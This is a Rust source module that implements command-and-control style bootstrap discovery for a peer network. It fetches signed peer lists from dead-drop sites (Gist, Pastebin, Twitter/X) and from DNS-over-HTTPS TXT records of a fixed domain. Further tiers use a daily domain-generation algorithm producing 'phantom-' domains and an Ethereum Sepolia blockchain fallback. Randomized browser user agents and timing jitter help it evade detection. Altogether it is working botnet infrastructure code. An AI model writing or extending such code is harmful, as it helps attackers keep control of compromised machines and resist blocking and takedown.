use reqwest::Client;
use std::error::Error;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::sync::Arc;
use log::{info, debug, warn, error};
use base64::{Engine as _, engine::general_purpose};
use ed25519_dalek::{Verifier, VerifyingKey, Signature};
use rand::Rng;
use serde::Deserialize;
use tokio::task::JoinSet;

// --- CONFIGURATION ---
const CONNECT_TIMEOUT_SEC: u64 = 15;

const MASTER_PUB_KEY: [u8; 32] = [
    0x75, 0xbf, 0x34, 0x60, 0xf7, 0x00, 0x57, 0x06, 
    0xa3, 0x82, 0x85, 0x4d, 0x0b, 0x31, 0xc7, 0x63, 
    0x30, 0x4d, 0x15, 0x19, 0x18, 0xd1, 0xca, 0x87, 
    0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
];

// --- TRAITS ---

/// Abstract Provider for Bootstrapping logic (HTTP, DoH, P2P, etc.)
#[async_trait::async_trait]
pub trait BootstrapProvider: Send + Sync {
    /// Attempt to fetch the Raw Signed Payload "SIG:|MSG:"
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>>;
    
    /// Identification for logging
    fn name(&self) -> String;
}

// --- PROVIDERS ---

/// Dead Drop Provider (Github Gist, Pastebin, Twitter/X)
pub struct HttpProvider {
    pub url: String,
}

#[async_trait::async_trait]
impl BootstrapProvider for HttpProvider {
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
        let resp = client.get(&self.url).send().await?;
        let text = resp.text().await?;
        Ok(text)
    }

    fn name(&self) -> String {
        format!("HTTP({})", self.url)
    }
}

/// DNS-over-HTTPS Provider (Google, Cloudflare, Quad9)
pub struct DohProvider {
    pub domain: String,
    pub resolver_url: String, // e.g. "https://dns.google/resolve"
}

#[derive(Deserialize)]
struct DohResponse {
    #[serde(rename = "Answer")]
    answer: Option<Vec<DohAnswer>>,
}

#[derive(Deserialize)]
struct DohAnswer {
    data: String,
}

#[async_trait::async_trait]
impl BootstrapProvider for DohProvider {
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
        // Construct DoH Query
        let url = format!("{}?name={}&type=TXT", self.resolver_url, self.domain);
        let resp = client.get(&url).send().await?.json::<DohResponse>().await?;

        if let Some(answers) = resp.answer {
            for answer in answers {
                // DoH TXT often comes as "\"SIG:...\""
                let raw_txt = answer.data.trim_matches('"').replace("\\\"", "\"");
                if raw_txt.contains("SIG:") {
                    return Ok(raw_txt);
                }
            }
        }
        Err(format!("No signed TXT record found for {}", self.domain).into())
    }

    fn name(&self) -> String {
        format!("DoH({} @ {})", self.domain, self.resolver_url)
    }
}

/// DGA Provider (Time-based Domain Generation)
pub struct DgaProvider {
    pub resolver_url: String,
}

impl DgaProvider {
    fn generate_domain(&self) -> String {
        let start = SystemTime::now();
        let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
        let seconds = since_the_epoch.as_secs();
        let day_slot = seconds / 86400;
        
        // Simple LCG/Hash compatible with Phantom/Cloud
        let seed: u64 = 0xCAFEBABE;
        let mut state = day_slot ^ seed;
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        
        format!("phantom-{:x}.com", state & 0xFFFFFF)
    }
}

#[async_trait::async_trait]
impl BootstrapProvider for DgaProvider {
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
        let domain = self.generate_domain();
        debug!("[Bootstrap] DGA Generated: {}", domain);
        
        let url = format!("{}?name={}&type=TXT", self.resolver_url, domain);
        let resp = client.get(&url).send().await?.json::<DohResponse>().await?;

        if let Some(answers) = resp.answer {
            for answer in answers {
                let raw_txt = answer.data.trim_matches('"').replace("\\\"", "\"");
                if raw_txt.contains("SIG:") {
                    return Ok(raw_txt);
                }
            }
        }
        Err(format!("No signed TXT record found for DGA {}", domain).into())
    }

    fn name(&self) -> String {
        format!("DoH-DGA(Today @ {})", self.resolver_url)
    }
}


// --- REVISED STRUCT DEFINITION & IMPL ---

/// Blockchain Fallback Provider (Sepolia)
pub struct EthProvider;

#[async_trait::async_trait]
impl BootstrapProvider for EthProvider {
    async fn fetch_payload(&self, _client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
         Err("Use explicit Tier 3 call".into())
    }

    fn name(&self) -> String {
        "Ethereum Sepolia (Fallback)".to_string()
    }
}

pub struct ProfessionalBootstrapper {
    primary_providers: Vec<Arc<dyn BootstrapProvider>>, // Tier 1: dht.polydevs.uk
    fallback_providers: Vec<Arc<dyn BootstrapProvider>>, // Tier 2: DGA
    client: Client,
}

impl ProfessionalBootstrapper {
    pub fn new() -> Self {
        let user_agents = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ];
        let ua = user_agents[rand::thread_rng().gen_range(0..user_agents.len())];
        
        // Default Configuration
        let mut bs = Self {
            primary_providers: Vec::new(),
            fallback_providers: Vec::new(),
            client: Client::builder()
                .timeout(Duration::from_secs(CONNECT_TIMEOUT_SEC))
                .user_agent(ua)
                .build()
                .unwrap(),
        };

        // 1. Primary: dht.polydevs.uk
        bs.primary_providers.push(Arc::new(DohProvider {
            domain: "dht.polydevs.uk".to_string(),
            resolver_url: "https://dns.google/resolve".to_string(),
        }));

        // 2. Secondary: DGA
        bs.fallback_providers.push(Arc::new(DgaProvider {
            resolver_url: "https://dns.google/resolve".to_string(),
        }));
        
        bs
    }
    
    // Legacy helper (adds to primary)
    pub fn add_provider(&mut self, provider: Arc<dyn BootstrapProvider>) {
        self.primary_providers.push(provider);
    }
    
    async fn race_tier(&self, tier: &[Arc<dyn BootstrapProvider>]) -> Option<Vec<(String, u16)>> {
        if tier.is_empty() { return None; }
        
        let mut set = JoinSet::new();
        for provider in tier {
             let p = provider.clone();
             let c = self.client.clone();
             set.spawn(async move {
                 // Jitter: Sleep 0-2s to avoid simultaneous packets
                 let jitter = rand::thread_rng().gen_range(0..2000);
                 tokio::time::sleep(Duration::from_millis(jitter)).await;
                 match p.fetch_payload(&c).await {
                    Ok(payload) => verify_signature(&payload).map(|ips| (p.name(), ips)),
                    Err(e) => Err(e),
                 }
             });
        }
        
        while let Some(res) = set.join_next().await {
            match res {
                Ok(Ok((source_name, peers))) => {
                    info!("[Bootstrap] SUCCESS via {}. Found {} peers.", source_name, peers.len());
                    set.abort_all();
                    return Some(peers);
                }
                _ => {}
            }
        }
        None
    }

    pub async fn resolve(&self) -> Option<Vec<(String, u16)>> {
        info!("[Bootstrap] Starting Tiered Resolution.");
        
        // Tier 1: Primary
        info!("[Bootstrap] Attempting Tier 1 (Home)...");
        if let Some(nodes) = self.race_tier(&self.primary_providers).await {
            return Some(nodes);
        }

        // Tier 2: Fallback
        info!("[Bootstrap] Tier 1 Failed. Attempting Tier 2 (DGA)...");
        if let Some(nodes) = self.race_tier(&self.fallback_providers).await {
            return Some(nodes);
        }

        // Tier 3: Blockchain (Last Resort)
        info!("[Bootstrap] Tier 2 Failed. Attempting Tier 3 (Sepolia Blockchain)...");
        use crate::modules::eth_listener;
        if let Some(nodes) = eth_listener::check_sepolia_fallback().await {
             info!("[Bootstrap] SUCCESS via Tier 3 (Sepolia). Found {} peers.", nodes.len());
             return Some(nodes);
        }

        warn!("[Bootstrap] All Tiers Failed.");
        None
    }
}

// --- HELPER FUNCTIONS ---

fn verify_signature(text: &str) -> Result<Vec<(String, u16)>, Box<dyn Error + Send + Sync>> {
    let text = text.trim();
    let parts: Vec<&str> = text.split('|').collect();

    if parts.len() != 2 {
        return Err("Invalid Payload Format (Required SIG|MSG)".into());
    }

    let sig_part = parts[0].strip_prefix("SIG:").ok_or("Missing SIG prefix")?;
    let msg_part = parts[1].strip_prefix("MSG:").ok_or("Missing MSG prefix")?;

    let sig_bytes = general_purpose::STANDARD.decode(sig_part)?;
    let msg_bytes = general_purpose::STANDARD.decode(msg_part)?;

    let vk = VerifyingKey::from_bytes(&MASTER_PUB_KEY).map_err(|_| "Invalid PubKey")?;
    let signature = Signature::from_bytes(&sig_bytes.try_into().map_err(|_| "Invalid Sig Len")?);

    vk.verify(&msg_bytes, &signature).map_err(|e| format!("Crypto Fail: {}", e))?;
    
    debug!("[Bootstrap] Logic Signature Verified.");
    
    let msg_str = String::from_utf8(msg_bytes)?;
    parse_ip_list(&msg_str)
}

fn parse_ip_list(decoded_str: &str) -> Result<Vec<(String, u16)>, Box<dyn Error + Send + Sync>> {
    let mut peers = Vec::new();
    for part in decoded_str.split(';') {
        if part.is_empty() { continue; }
        if let Some((ip, port_str)) = part.split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                peers.push((ip.to_string(), port));
            }
        }
    }
    if peers.is_empty() {
        return Err("No legitimate peers parsed".into());
    }
    Ok(peers)
}
